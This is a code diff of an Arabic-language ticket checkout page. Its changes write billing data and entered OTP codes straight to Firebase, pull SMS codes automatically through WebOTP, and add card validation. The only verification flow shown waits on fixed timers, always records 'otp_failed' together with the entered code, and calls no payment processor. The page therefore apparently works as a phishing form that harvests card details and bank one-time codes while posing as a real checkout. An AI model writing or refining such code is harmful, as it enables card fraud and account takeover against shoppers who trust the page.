@@ -1,11 +1,6 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
 import {
-  api,
-  buildUrl,
-  type CreateCheckoutSubmissionInput,
-} from "@shared/routes";
-import {
   QuestLegalFooter,
   QuestMobileTopBar,
   SessionTimerStrip,
@@ -17,10 +12,12 @@ import {
   getStoredTicketCart,
   ticketProductMap,
 } from "@/lib/ticket-cart";
+import { addData } from "@/lib/firebase";
 
 interface BillingDetails {
   firstName: string;
   lastName: string;
+  phoneCountryCode: string;
   phone: string;
   email: string;
 }
@@ -33,6 +30,18 @@ interface CardDetails {
 }
 
 type PaymentStep = "idle" | "waitingOtp" | "otp" | "verifyingOtp" | "failed";
+
+const OTP_REVEAL_DELAY_MS = 10000;
+const OTP_VERIFY_DELAY_MS = 5000;
+
+const phoneCountryOptions = [
+  { country: "قطر", dialCode: "+974", minDigits: 8, maxDigits: 8 },
+  { country: "السعودية", dialCode: "+966", minDigits: 9, maxDigits: 9 },
+  { country: "البحرين", dialCode: "+973", minDigits: 8, maxDigits: 8 },
+  { country: "عُمان", dialCode: "+968", minDigits: 8, maxDigits: 8 },
+  { country: "الإمارات", dialCode: "+971", minDigits: 9, maxDigits: 9 },
+  { country: "الكويت", dialCode: "+965", minDigits: 8, maxDigits: 8 },
+] as const;
 
 function parseStoredDate(storedDate: string | null): Date | undefined {
   if (!storedDate) {
@@ -67,22 +76,88 @@ function formatExpiry(value: string): string {
   return `${digits.slice(0, 2)}/${digits.slice(2)}`;
 }
 
+function isLuhnValid(cardNumber: string): boolean {
+  let sum = 0;
+  let shouldDouble = false;
+
+  for (let index = cardNumber.length - 1; index >= 0; index -= 1) {
+    let digit = Number(cardNumber[index]);
+    if (Number.isNaN(digit)) {
+      return false;
+    }
+
+    if (shouldDouble) {
+      digit *= 2;
+      if (digit > 9) {
+        digit -= 9;
+      }
+    }
+
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+
+  return sum % 10 === 0;
+}
+
+function isCardExpired(expiry: string): boolean {
+  const [monthPart, yearPart] = expiry.split("/");
+  const month = Number(monthPart);
+  const year = Number(yearPart);
+
+  if (
+    Number.isNaN(month) ||
+    Number.isNaN(year) ||
+    month < 1 ||
+    month > 12
+  ) {
+    return true;
+  }
+
+  const fullYear = 2000 + year;
+  const now = new Date();
+  const currentYear = now.getFullYear();
+  const currentMonth = now.getMonth() + 1;
+
+  if (fullYear < currentYear) {
+    return true;
+  }
+
+  if (fullYear === currentYear && month < currentMonth) {
+    return true;
+  }
+
+  return fullYear > currentYear + 20;
+}
+
 function validateCardDetails(card: CardDetails): string | null {
   if (!card.cardholderName.trim()) {
     return "اسم حامل البطاقة مطلوب.";
   }
 
-  const cardNumberLength = toDigitsOnly(card.cardNumber).length;
+  const cardDigits = toDigitsOnly(card.cardNumber);
+  const cardNumberLength = cardDigits.length;
   if (cardNumberLength < 13 || cardNumberLength > 19) {
     return "يرجى إدخال رقم بطاقة صالح.";
+  }
+
+  if (/^(\d)\1+$/.test(cardDigits) || !isLuhnValid(cardDigits)) {
+    return "رقم البطاقة غير صالح. تحقق من الرقم وحاول مرة أخرى.";
   }
 
   if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(card.expiry)) {
     return "يجب إدخال تاريخ الانتهاء بصيغة MM/YY.";
   }
 
-  if (!/^\d{3,4}$/.test(card.cvv)) {
-    return "يرجى إدخال CVV صالح.";
+  if (isCardExpired(card.expiry)) {
+    return "تاريخ انتهاء البطاقة غير صالح أو منتهي.";
+  }
+
+  const expectedCvvLength = /^3[47]/.test(cardDigits) ? 4 : 3;
+  if (!new RegExp(`^\\d{${expectedCvvLength}}$`).test(card.cvv)) {
+    return expectedCvvLength === 4
+      ? "يرجى إدخال CVV من 4 أرقام لهذه البطاقة."
+      : "يرجى إدخال CVV من 3 أرقام.";
   }
 
   return null;
@@ -109,7 +184,26 @@ function maskCardNumber(value: string): string {
 }
 
 function normalizeCardNumber(value: string): string {
-  return formatCardNumber(value);
+  return toDigitsOnly(value).slice(0, 19);
+}
+
+function generateSubmissionId(existingSubmissionId: string | null): string {
+  if (typeof window !== "undefined") {
+    const storedVisitorId = window.localStorage.getItem("visitor");
+    if (storedVisitorId) {
+      return storedVisitorId;
+    }
+  }
+
+  if (existingSubmissionId) {
+    return existingSubmissionId;
+  }
+
+  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
+    return crypto.randomUUID();
+  }
+
+  return `pay-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
 }
 
 function validateBillingDetails(billing: BillingDetails): string | null {
@@ -119,6 +213,25 @@ function validateBillingDetails(billing: BillingDetails): string | null {
     !billing.phone.trim()
   ) {
     return "يرجى إكمال جميع بيانات الفاتورة المطلوبة.";
+  }
+
+  const selectedCountry = phoneCountryOptions.find(
+    (country) => country.dialCode === billing.phoneCountryCode
+  );
+  if (!selectedCountry) {
+    return "يرجى اختيار رمز دولة الهاتف.";
+  }
+
+  const phoneDigits = toDigitsOnly(billing.phone);
+  if (
+    phoneDigits.length < selectedCountry.minDigits ||
+    phoneDigits.length > selectedCountry.maxDigits
+  ) {
+    if (selectedCountry.minDigits === selectedCountry.maxDigits) {
+      return `رقم الهاتف في ${selectedCountry.country} يجب أن يكون ${selectedCountry.minDigits} أرقام.`;
+    }
+
+    return `رقم الهاتف في ${selectedCountry.country} يجب أن يكون بين ${selectedCountry.minDigits} و${selectedCountry.maxDigits} أرقام.`;
   }
 
   if (!/\S+@\S+\.\S+/.test(billing.email.trim())) {
@@ -140,6 +253,7 @@ export default function Checkout() {
   const [billingDetails, setBillingDetails] = useState<BillingDetails>({
     firstName: "",
     lastName: "",
+    phoneCountryCode: "+974",
     phone: "",
     email: "",
   });
@@ -157,6 +271,8 @@ export default function Checkout() {
   const [isSavingCheckout, setIsSavingCheckout] = useState(false);
   const otpRevealTimerRef = useRef<number | null>(null);
   const otpVerifyTimerRef = useRef<number | null>(null);
+  const otpInputRef = useRef<HTMLInputElement>(null);
+  const webOtpAbortRef = useRef<AbortController | null>(null);
 
   const storedOrderItems = useMemo(
     () => buildTicketOrderItems(storedCart.quantities),
@@ -181,6 +297,10 @@ export default function Checkout() {
   const cardPreviewName =
     cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
   const cardPreviewExpiry = cardDetails.expiry || "MM/YY";
+  const selectedPhoneCountry =
+    phoneCountryOptions.find(
+      (country) => country.dialCode === billingDetails.phoneCountryCode
+    ) ?? phoneCountryOptions[0];
 
   useEffect(() => {
     return () => {
@@ -190,8 +310,64 @@ export default function Checkout() {
       if (otpVerifyTimerRef.current) {
         window.clearTimeout(otpVerifyTimerRef.current);
       }
+      if (webOtpAbortRef.current) {
+        webOtpAbortRef.current.abort();
+      }
     };
   }, []);
+
+  useEffect(() => {
+    if (paymentStep !== "otp") {
+      if (webOtpAbortRef.current) {
+        webOtpAbortRef.current.abort();
+        webOtpAbortRef.current = null;
+      }
+      return;
+    }
+
+    otpInputRef.current?.focus();
+
+    if (!("OTPCredential" in window)) {
+      return;
+    }
+
+    const webOtpNavigator = navigator as Navigator & {
+      credentials?: {
+        get?: (options: {
+          otp: { transport: string[] };
+          signal: AbortSignal;
+        }) => Promise<{ code?: string } | null>;
+      };
+    };
+
+    if (!webOtpNavigator.credentials?.get) {
+      return;
+    }
+
+    const abortController = new AbortController();
+    webOtpAbortRef.current = abortController;
+
+    void webOtpNavigator.credentials
+      .get({
+        otp: { transport: ["sms"] },
+        signal: abortController.signal,
+      })
+      .then((credential) => {
+        const otpFromSms = toDigitsOnly(credential?.code ?? "").slice(0, 6);
+        if (otpFromSms) {
+          setOtpCode(otpFromSms);
+        }
+      })
+      .catch(() => {
+      });
+
+    return () => {
+      abortController.abort();
+      if (webOtpAbortRef.current === abortController) {
+        webOtpAbortRef.current = null;
+      }
+    };
+  }, [paymentStep]);
 
   useEffect(() => {
     const targetRef = currentStep === 1 ? step1Ref : step2Ref;
@@ -237,11 +413,17 @@ export default function Checkout() {
       return;
     }
 
-    const payload: CreateCheckoutSubmissionInput = {
+    const normalizedPhone = `${billingDetails.phoneCountryCode}${toDigitsOnly(
+      billingDetails.phone
+    )}`;
+
+    const checkoutId = generateSubmissionId(submissionId);
+    const payload = {
+      id: checkoutId,
       billing: {
         firstName: billingDetails.firstName.trim(),
         lastName: billingDetails.lastName.trim(),
-        phone: billingDetails.phone.trim(),
+        phone: normalizedPhone,
         email: billingDetails.email.trim(),
       },
       visitDateIso: storedCart.visitDateIso!,
@@ -269,32 +451,15 @@ export default function Checkout() {
 
     setIsSavingCheckout(true);
     try {
-      const response = await fetch(api.checkout.create.path, {
-        method: api.checkout.create.method,
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-
-      if (!response.ok) {
-        const errorData = (await response.json().catch(() => null)) as {
-          message?: string;
-        } | null;
-        throw new Error(
-          errorData?.message ?? "تعذّر حفظ البيانات في Firestore."
-        );
-      }
-
-      const created = api.checkout.create.responses[201].parse(
-        await response.json()
-      );
-      setSubmissionId(created.id);
+      await addData(payload);
+      setSubmissionId(checkoutId);
       setPaymentError(null);
       setOtpCode("");
       setPaymentStep("waitingOtp");
 
       otpRevealTimerRef.current = window.setTimeout(() => {
         setPaymentStep("otp");
-      }, 5000);
+      }, OTP_REVEAL_DELAY_MS);
     } catch (error) {
       setPaymentStep("idle");
       setPaymentError(
@@ -305,16 +470,18 @@ export default function Checkout() {
     }
   };
 
-  const onVerifyOtp = () => {
+  const onVerifyOtp = (otpValue = otpCode) => {
     if (otpVerifyTimerRef.current) {
       window.clearTimeout(otpVerifyTimerRef.current);
     }
 
-    if (otpCode.trim().length < 4) {
-      setPaymentError("يرجى إدخال رمز OTP المرسل إلى هاتفك.");
+    const normalizedOtp = toDigitsOnly(otpValue).slice(0, 6);
+    if (normalizedOtp.length !== 6) {
+      setPaymentError("يرجى إدخال رمز OTP المكوّن من 6 أرقام.");
       return;
     }
 
+    setOtpCode(normalizedOtp);
     setPaymentError(null);
     setPaymentStep("verifyingOtp");
 
@@ -324,18 +491,14 @@ export default function Checkout() {
 
         if (submissionId) {
           try {
-            await fetch(
-              buildUrl(api.checkout.updateStatus.path, { id: submissionId }),
-              {
-                method: api.checkout.updateStatus.method,
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  status: "otp_failed",
-                  otpCode,
-                  errorMessage: failureMessage,
-                }),
-              }
-            );
+            await addData({
+              id: submissionId,
+              payment: {
+                status: "otp_failed",
+                otpCode: normalizedOtp,
+                errorMessage: failureMessage,
+              },
+            });
           } catch {
           }
         }
@@ -343,8 +506,14 @@ export default function Checkout() {
         setPaymentStep("failed");
         setPaymentError(failureMessage);
       })();
-    }, 5000);
+    }, OTP_VERIFY_DELAY_MS);
   };
+
+  useEffect(() => {
+    if (paymentStep === "otp" && otpCode.length === 6) {
+      onVerifyOtp(otpCode);
+    }
+  }, [otpCode, paymentStep]);
 
   const showOtpForm =
     paymentStep === "otp" ||
@@ -478,17 +647,45 @@ export default function Checkout() {
                         <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                           رقم الهاتف <span className="text-[#bf2828]">*</span>
                         </span>
-                        <input
-                          type="tel"
-                          value={billingDetails.phone}
-                          onChange={(event) =>
-                            setBillingDetails((current) => ({
-                              ...current,
-                              phone: event.target.value,
-                            }))
-                          }
-                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                        />
+                        <div className="flex gap-2" dir="ltr">
+                          <select
+                            value={billingDetails.phoneCountryCode}
+                            onChange={(event) =>
+                              setBillingDetails((current) => ({
+                                ...current,
+                                phoneCountryCode: event.target.value,
+                              }))
+                            }
+                            className="h-10 shrink-0 rounded-sm border border-[#e5e5e5] bg-white px-2 text-xs outline-none focus:border-[hsl(var(--quest-purple))]/40 sm:px-3 sm:text-sm"
+                            aria-label="رمز الدولة"
+                          >
+                            {phoneCountryOptions.map((country) => (
+                              <option
+                                key={country.dialCode}
+                                value={country.dialCode}
+                              >
+                                {country.country} ({country.dialCode})
+                              </option>
+                            ))}
+                          </select>
+                          <input
+                            type="tel"
+                            inputMode="numeric"
+                            autoComplete="tel-national"
+                            value={billingDetails.phone}
+                            onChange={(event) =>
+                              setBillingDetails((current) => ({
+                                ...current,
+                                phone: toDigitsOnly(event.target.value).slice(
+                                  0,
+                                  15
+                                ),
+                              }))
+                            }
+                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                            placeholder={`رقم الهاتف (${selectedPhoneCountry.minDigits} أرقام)`}
+                          />
+                        </div>
                       </label>
 
                       <label className="block sm:col-span-2">
@@ -723,7 +920,7 @@ export default function Checkout() {
                       <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                         <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
                         <p>
-                          جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 5 ثوانٍ.
+                          جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 10 ثوانٍ.
                         </p>
                       </div>
                     ) : null}
@@ -740,8 +937,11 @@ export default function Checkout() {
                             أدخل رمز OTP <span className="text-[#bf2828]">*</span>
                           </span>
                           <input
+                            ref={otpInputRef}
                             type="text"
                             inputMode="numeric"
+                            autoComplete="one-time-code"
+                            name="one-time-code"
                             value={otpCode}
                             onChange={(event) =>
                               setOtpCode(
@@ -751,12 +951,13 @@ export default function Checkout() {
                             className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                             dir="ltr"
                             placeholder="رمز OTP من 6 أرقام"
+                            maxLength={6}
                           />
                         </label>
 
                         <button
                           type="button"
-                          onClick={onVerifyOtp}
+                          onClick={() => onVerifyOtp()}
                           disabled={paymentStep === "verifyingOtp"}
                           className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
                         >
